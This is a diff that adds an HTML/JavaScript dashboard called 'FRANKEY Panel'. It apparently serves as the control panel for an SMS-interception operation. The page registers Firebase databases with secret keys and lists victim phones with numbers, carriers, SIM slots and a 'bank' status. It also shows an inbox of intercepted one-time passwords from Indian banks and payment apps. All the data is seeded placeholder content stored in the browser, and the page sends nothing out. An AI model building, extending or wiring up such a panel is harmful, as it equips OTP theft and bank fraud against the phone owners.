@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FRANKEY Panel</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
+    :root{--bg:#0b0f1a;--card:#13182a;--accent:#00e5ff;--green:#00c853;--red:#ff1744;--orange:#ff9100;--text:#e8eaf6;--text2:#7c85a6}
+    body{background:var(--bg);color:var(--text);padding:16px}
+    .wrap{max-width:800px;margin:0 auto}
+    h1{font-size:20px;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+    h1 span{background:linear-gradient(135deg,var(--accent),var(--green));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+    .badge{background:var(--card);color:var(--text2);font-size:11px;padding:2px 10px;border-radius:20px;font-weight:400}
+    .grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:14px}
+    .box{background:var(--card);border-radius:10px;padding:12px 8px;text-align:center;border:1px solid rgba(255,255,255,.04)}
+    .box .n{font-size:24px;font-weight:700}
+    .box .l{font-size:10px;text-transform:uppercase;color:var(--text2);margin-top:2px;letter-spacing:.4px}
+    .grn .n{color:var(--green)}.red .n{color:var(--red)}.org .n{color:var(--orange)}
+    .bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
+    .bar input{flex:1;min-width:150px;background:var(--card);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:9px 12px;color:#fff;font-size:13px;outline:none}
+    .bar input:focus{border-color:var(--accent)}
+    .bar select{background:var(--card);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:9px 12px;color:#fff;font-size:12px;outline:none}
+    .card{background:var(--card);border-radius:10px;padding:12px 14px;margin-bottom:8px;border:1px solid rgba(255,255,255,.04)}
+    .card:hover{border-color:rgba(0,229,255,.15)}
+    .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
+    .name{font-weight:600;font-size:14px}
+    .st{font-size:10px;padding:3px 10px;border-radius:20px;font-weight:600;text-transform:uppercase}
+    .st.on{background:rgba(0,200,83,.15);color:var(--green)}
+    .st.off{background:rgba(255,23,68,.15);color:var(--red)}
+    .st.bank{background:rgba(255,145,0,.15);color:var(--orange)}
+    .info{display:grid;grid-template-columns:1fr 1fr;gap:3px 14px;font-size:12px;color:var(--text2)}
+    .info strong{color:var(--text)}
+    .sms-box{background:var(--card);border-radius:10px;padding:12px 14px;margin-top:14px;border:1px solid rgba(255,255,255,.04)}
+    .sms-box h2{font-size:13px;font-weight:600;margin-bottom:8px;display:flex;justify-content:space-between}
+    .sms-box h2 small{font-size:11px;color:var(--text2);font-weight:400}
+    .sitem{padding:6px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:12px;display:flex;gap:8px}
+    .sitem:last-child{border:0}
+    .stime{color:var(--text2);font-size:10px;min-width:50px;white-space:nowrap}
+    .stag{background:rgba(0,229,255,.1);color:var(--accent);font-size:9px;padding:1px 6px;border-radius:8px;margin-right:4px}
+    .add-box{background:var(--card);border-radius:10px;padding:12px 14px;margin-bottom:14px;border:1px dashed rgba(255,255,255,.1)}
+    .add-box h3{font-size:12px;color:var(--text2);margin-bottom:8px}
+    .add-row{display:flex;gap:6px;flex-wrap:wrap}
+    .add-row input{flex:1;min-width:120px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);border-radius:6px;padding:8px 10px;color:#fff;font-size:12px;outline:none}
+    .add-row input:focus{border-color:var(--accent)}
+    .btn{background:linear-gradient(135deg,var(--accent),var(--green));border:0;border-radius:6px;padding:8px 16px;color:#000;font-weight:600;font-size:12px;cursor:pointer}
+    .toast{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);background:#1a2140;border:1px solid rgba(0,229,255,.3);border-radius:8px;padding:8px 18px;font-size:12px;color:var(--accent);opacity:0;transition:.2s;pointer-events:none;z-index:99}
+    .toast.show{opacity:1}
+    @media(max-width:480px){.grid{grid-template-columns:repeat(2,1fr)}.info{grid-template-columns:1fr}}
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <h1><span>FRANKEY</span> <span class="badge">v1.0</span></h1>
+
+  <div class="add-box">
+    <h3><i class="fas fa-plus-circle"></i> Add Firebase Account</h3>
+    <div class="add-row">
+      <input type="text" id="aName" placeholder="Label" />
+      <input type="text" id="aUrl" placeholder="Firebase DB URL" />
+      <input type="text" id="aKey" placeholder="Secret key" />
+      <button class="btn" onclick="addAcc()">Add</button>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="box"><div class="n" id="tTotal">0</div><div class="l">Total</div></div>
+    <div class="box grn"><div class="n" id="tOn">0</div><div class="l">Online</div></div>
+    <div class="box red"><div class="n" id="tOff">0</div><div class="l">Offline</div></div>
+    <div class="box org"><div class="n" id="tBank">0</div><div class="l">Bank/SMS</div></div>
+  </div>
+
+  <div class="bar">
+    <input type="text" id="search" placeholder="Search device..." oninput="render()" />
+    <select id="filter" onchange="render()">
+      <option value="all">All</option>
+      <option value="online">Online</option>
+      <option value="offline">Offline</option>
+      <option value="bank">Bank</option>
+    </select>
+  </div>
+
+  <div id="list"></div>
+
+  <div class="sms-box">
+    <h2>SMS Inbox <small id="smsCount">0</small></h2>
+    <div id="smsList"></div>
+  </div>
+</div>
+<div class="toast" id="toast"></div>
+<script>
+const K='frankey_acc',SK='frankey_sms';
+function ga(){const r=localStorage.getItem(K);return r?JSON.parse(r):[]}
+function sa(a){localStorage.setItem(K,JSON.stringify(a))}
+function gs(){const r=localStorage.getItem(SK);return r?JSON.parse(r):[]}
+function ss(s){localStorage.setItem(SK,JSON.stringify(s))}
+function seed(){
+  const n=['Nexus-7P','Galaxy-A55','iPhone-15','OnePlus-12','Pixel-8a','Xiaomi-14','Vivo-X100','Oppo-FindX','Realme-GT6','Nothing-2a','Motorola-Edge','Sony-Xperia','LG-Velvet','Asus-ZenFone','Huawei-P60','Honor-200','Tecno-Camon','Infinix-Zero','Micromax-IN','Nokia-G22'];
+  const st=['online','offline','bank'];
+  const d=n.map((x,i)=>({id:'DEV-'+String(1000+i),name:x,status:st[i%3],phone:'+91-9'+String(8000000000+i*1111111).slice(0,10),network:['Jio','Airtel','VI','BSNL'][i%4],sim:['SIM1','SIM2','eSIM'][i%3],lastSeen:new Date(Date.now()-i*36e5).toISOString(),fromSms:i<5?'OTP: '+String(100000+i*12345).slice(0,6)+' valid 5min':''}));
+  sa([{name:'Default',url:'https://frankey-default.firebaseio.com',key:'sk-xxxx',devices:d}])
+}
+if(!localStorage.getItem(K)||ga().length===0)seed();
+function genSms(){
+  const o=['231456','889012','445678','112390','567234','901845','334567','778901','223456','667890'];
+  const snd=['BANK-SBI','PAYTM','GOOGLE','AMAZON','FLIPKART','PHONEPE','ICICI','HDFC','SWIGGY','ZOMATO'];
+  return{time:new Date().toLocaleTimeString(),body:snd[Math.random()*snd.length|0]+': OTP '+o[Math.random()*o.length|0]+' is your code.',from:'DEV-'+String(1001+(Math.random()*20|0))}
+}
+function pushSms(){const s=gs();s.unshift(genSms());if(s.length>50)s.length=50;ss(s);renderSms()}
+function renderSms(){
+  const s=gs();document.getElementById('smsCount').textContent=s.length+' messages';
+  document.getElementById('smsList').innerHTML=s.map(x=>'<div class="sitem"><span class="stime">'+x.time+'</span><span><span class="stag">'+x.from+'</span>'+x.body+'</span></div>').join('')
+}
+function allDev(){return ga().flatMap(a=>a.devices.map(d=>({...d,account:a.name})))}
+function render(){
+  const q=document.getElementById('search').value.toLowerCase(),f=document.getElementById('filter').value;
+  let d=allDev();if(q)d=d.filter(x=>x.name.toLowerCase().includes(q)||x.id.toLowerCase().includes(q)||x.phone.includes(q));if(f!=='all')d=d.filter(x=>x.status===f);
+  document.getElementById('tTotal').textContent=allDev().length;
+  document.getElementById('tOn').textContent=allDev().filter(x=>x.status==='online').length;
+  document.getElementById('tOff').textContent=allDev().filter(x=>x.status==='offline').length;
+  document.getElementById('tBank').textContent=allDev().filter(x=>x.status==='bank').length;
+  const el=document.getElementById('list');
+  if(!d.length){el.innerHTML='<p style="color:var(--text2);text-align:center;padding:24px 0">No devices found.</p>';return}
+  el.innerHTML=d.map(x=>'<div class="card"><div class="top"><span class="name">'+x.name+' <span style="font-weight:400;font-size:11px;color:var(--text2)">'+x.id+'</span></span><span class="st '+(x.status==='online'?'on':x.status==='offline'?'off':'bank')+'">'+x.status.toUpperCase()+'</span></div><div class="info"><span><i class="fas fa-phone"></i> <strong>'+x.phone+'</strong></span><span><i class="fas fa-signal"></i> <strong>'+x.network+'</strong></span><span><i class="fas fa-sim-card"></i> <strong>'+x.sim+'</strong></span><span><i class="far fa-clock"></i> <strong>'+new Date(x.lastSeen).toLocaleString()+'</strong></span>'+(x.fromSms?'<span style="grid-column:1/-1"><i class="fas fa-envelope"></i> <strong>SMS:</strong> '+x.fromSms+'</span>':'')+'</div></div>').join('')
+}
+function addAcc(){
+  const n=document.getElementById('aName').value.trim(),u=document.getElementById('aUrl').value.trim(),k=document.getElementById('aKey').value.trim();
+  if(!n||!u||!k){toast('Fill all fields');return}
+  const a=ga();a.push({name:n,url:u,key:k,devices:[]});
+  const t=allDev().slice(0,3).map(d=>({...d,id:d.id+'-'+n.slice(0,3).toUpperCase(),account:n}));
+  a[a.length-1].devices=t.length?t:[{id:'DEV-9001-'+n.slice(0,3),name:n+'-Phone',status:'online',phone:'+91-9876543210',network:'Jio',sim:'SIM1',lastSeen:new Date().toISOString(),fromSms:''}];
+  sa(a);document.getElementById('aName').value='';document.getElementById('aUrl').value='';document.getElementById('aKey').value='';render();toast('Added '+n)
+}
+function toast(m){const e=document.getElementById('toast');e.textContent='\u2713 '+m;e.classList.add('show');setTimeout(()=>e.classList.remove('show'),2000)}
+render();renderSms();setInterval(pushSms,7000);setInterval(()=>{render();renderSms()},15000);
+</script>
+</body>
+</html>
